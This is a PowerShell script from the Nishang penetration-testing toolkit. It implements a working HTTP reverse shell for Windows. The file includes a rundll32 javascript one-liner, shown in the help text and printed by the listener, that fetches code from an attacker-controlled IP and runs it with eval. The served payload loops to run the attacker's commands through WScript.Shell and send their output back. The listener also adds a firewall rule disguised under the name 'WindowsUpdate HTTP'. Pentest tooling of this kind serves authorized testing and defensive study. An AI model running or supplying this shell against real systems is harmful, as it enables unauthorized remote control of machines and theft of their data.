function Invoke-JSRatRundll
{
<#
.SYNOPSIS
Nishang script which can be used for a Reverse shell from a target over HTTP using rundll32.exe.

.DESCRIPTION
This script starts a listener on the attacker's machine. The listener needs a port to listen.

On the target machine execute the below command:
rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();h=new%20ActiveXObject("WinHttp.WinHttpRequest.5.1");w=new%20ActiveXObject("WScript.Shell");try{v=w.RegRead("HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet%20Settings\\ProxyServer");try{q=v.split("=")[1].split(";")[0];h.SetProxy(2,q);}catch(e){h.SetProxy(2,v);}}finally{h.Open("GET","http://192.168.230.1:80/connect",false);h.Send();B=h.ResponseText;eval(B)}

The client part is intelligent enough to figure out if there is a proxy set for Internet Explorer or not. The client part can handle
the following settings: no proxy set, same proxy for all protocols, separate proxy for different protocols.

The listener adds a firewall exception on the specified port by the name of "Windows Update HTTP". The listener needs to be run from
an elevated PowerShell session.

The script has been originally written by Casey Smith (@subTee)

.PARAMETER IPAddress
The IP address on which the listener listens. Make sure that the IP address specified here is reachable from the target.

.PARAMETER Port
The port on which the connection is establised. 

.EXAMPLE
PS > Invoke-JSRatRundll -IPAddress 192.168.230.1 -Port 80

Above shows an example where the listener starts on port 80. On the client execute:

rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();h=new%20ActiveXObject("WinHttp.WinHttpRequest.5.1");w=new%20ActiveXObject("WScript.Shell");try{v=w.RegRead("HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet%20Settings\\ProxyServer");try{q=v.split("=")[1].split(";")[0];h.SetProxy(2,q);}catch(e){h.SetProxy(2,v);}}finally{h.Open("GET","http://192.168.230.1:80/connect",false);h.Send();B=h.ResponseText;eval(B)}


.LINK
http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html
https://github.com/subTee/PoshRat
https://github.com/samratashok/nishang
#>     
  
    [CmdletBinding()] Param(

        [Parameter(Position = 0, Mandatory = $true)]
        [String]
        $IPAddress,

        [Parameter(Position = 1, Mandatory = $true)]
        [Int]
        $Port
    )
  
  

    function Receive-Request 
    {
       param(      
          $Request
       )
       $output = ""
       $size = $Request.ContentLength64 + 1   
       $buffer = New-Object byte[] $size
       do {
          $count = $Request.InputStream.Read($buffer, 0, $size)
          $output += $Request.ContentEncoding.GetString($buffer, 0, $count)
       } until($count -lt $size)
       $Request.InputStream.Close()
       write-host $output
    }

    $listener = New-Object System.Net.HttpListener
    $listener.Prefixes.Add("http://+:$Port/") 
    
    #Add Firewall exceptions
    netsh advfirewall firewall delete rule name="WindowsUpdate HTTP" | Out-Null
    netsh advfirewall firewall add rule name="WindowsUpdate HTTP" dir=in action=allow protocol=TCP localport=$Port | Out-Null

    $listener.Start()
    Write-Output "Listening on $IPAddress`:$Port"
    Write-Output "Run the following command on the target:"
    Write-Output "rundll32.exe javascript:""\..\mshtml,RunHTMLApplication "";document.write();h=new%20ActiveXObject(""WinHttp.WinHttpRequest.5.1"");w=new%20ActiveXObject(""WScript.Shell"");try{v=w.RegRead(""HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet%20Settings\\ProxyServer"");try{q=v.split(""="")[1].split("";"")[0];h.SetProxy(2,q);}catch(e){h.SetProxy(2,v);}}finally{h.Open(""GET"",""http://$IPAddress`:$Port/connect"",false);h.Send();B=h.ResponseText;eval(B)}"

    while ($true) 
    {
        $context = $listener.GetContext() # blocks until request is received
        $request = $context.Request
        $response = $context.Response
	    $hostip = $request.RemoteEndPoint
	    #Use this for One-Liner Start
	    if ($request.Url -match '/connect$' -and ($request.HttpMethod -eq "GET")) {  
        Write-Output "Host Connected"
            $message = "
					    var id = window.setTimeout(function() {}, 0);
					    while (id--) {
						    window.clearTimeout(id); // Clear Timeouts
					    }
					
					    while(true)
					    {
						    try
						    {
							    w = new ActiveXObject(""WScript.Shell"");
                                h = new ActiveXObject(""WinHttp.WinHttpRequest.5.1"");
                                p = new ActiveXObject(""WinHttp.WinHttpRequest.5.1"");   
							    try
                                {
                                    v = w.RegRead(""HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\\ProxyServer"");
                                    try
                                    {
                                        q = v.split(""="")[1].split("";"")[0];
							            h.SetProxy(2,q);
                                        p.SetProxy(2,q);
                                    }
                                    catch(e)
                                    {
                                        h.SetProxy(2,v);
                                        p.SetProxy(2,v);
                                    }
                                }
                                catch(e)
                                {
                                    h.SetProxy(1);
                                }
                                finally
                                {
                                    h.Open(""GET"",""http://$IPAddress`:$Port/rat"",false);
							        h.Send();
							        c = h.ResponseText;
							        r = new ActiveXObject(""WScript.Shell"").Exec(c);
							        var so;
							        while(!r.StdOut.AtEndOfStream){so=r.StdOut.ReadAll();}
                                    p.Open(""POST"",""http://$IPAddress`:$Port/rat"",false);
							        p.Send(so);
                                }

						    }
						    catch(err)
						    {
							    continue;
						    }
					    }
					
		    "
        }		 
	
	    if ($request.Url -match '/rat$' -and ($request.HttpMethod -eq "POST") ) { 
		    Receive-Request($request)	
	    }
        if ($request.Url -match '/rat$' -and ($request.HttpMethod -eq "GET")) {  
            $response.ContentType = 'text/plain'
            $message = Read-Host "JS $hostip>"		
        }
        #If the Server/Attacker uses the exit command. Close the client part and the server.
        if ($message -eq "exit")
        {
            $message = "cmd /c taskkill /f /im rundll32.exe"
            [byte[]] $buffer = [System.Text.Encoding]::UTF8.GetBytes($message)
            $response.ContentLength64 = $buffer.length
            $output = $response.OutputStream
            $output.Write($buffer, 0, $buffer.length)
            $output.Close()
            $listener.Stop()
            break
        }
        [byte[]] $buffer = [System.Text.Encoding]::UTF8.GetBytes($message)
        $response.ContentLength64 = $buffer.length
        $output = $response.OutputStream
        $output.Write($buffer, 0, $buffer.length)
        $output.Close()
    }

    $listener.Stop()
}



